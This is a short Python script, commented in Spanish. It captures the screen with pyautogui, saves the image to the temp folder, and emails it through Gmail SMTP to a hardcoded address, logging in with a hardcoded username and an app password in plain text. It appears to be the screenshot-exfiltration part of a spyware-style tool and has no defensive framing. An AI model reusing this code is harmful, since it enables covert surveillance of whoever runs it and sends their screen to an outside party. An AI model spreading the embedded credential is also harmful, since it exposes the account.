# Aqui estara la tralla por una parte el screenshot  y por otra el envío del correo.

import pyautogui
import subprocess
import ssl, smtplib
from email.message import EmailMessage
from email.mime.image import MIMEImage
import subprocess
import time

# Ruta del path
path = subprocess.run("powershell $env:tmp", stdout=subprocess.PIPE, universal_newlines=True, shell=True)
path = path.stdout
# Estanciamos los objetos a usar
em = EmailMessage()
context = ssl.create_default_context()


def capture_image(image_name):
    image_capture = pyautogui.screenshot()
    path_image = path.strip()+"\{}.png".format(image_name)
    image_capture.save(path_image)

    print ("Captured Image :)")
    return path_image



def send_image(path_image, email="juanmapipa4@gmail.com"):
    print ("Path image ==> ",path_image)
    try : 
        # Send Email

        em['From'] = 'caca@gmailcom'
        em['To'] = email
        em['Subject'] = 'Capture Image'

        em.set_content("Capture Image:")
        # Adjuntamos Imagen
        file = open(path_image, "rb")
        attach_image = MIMEImage(file.read())
        em.add_attachment(attach_image)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
            smtp.login('monolocacapop', 'ngkdwjlpolfrzyop')
            smtp.sendmail('monolocacapop', email, em.as_string())
    except:
        print ("No se pudo enviar")

